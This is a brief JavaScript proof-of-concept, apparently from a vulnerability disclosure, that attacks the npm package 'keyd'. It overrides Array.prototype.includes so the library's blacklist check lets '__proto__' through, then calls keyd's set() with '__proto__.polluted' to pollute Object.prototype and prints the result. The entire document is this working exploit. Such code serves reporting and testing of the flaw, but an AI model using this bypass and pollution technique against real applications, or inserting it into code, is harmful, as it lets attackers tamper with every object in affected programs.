Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const keyd = require('keyd');
keyd({}).set('__proto__.polluted', 'yes');
console.log({}.polluted);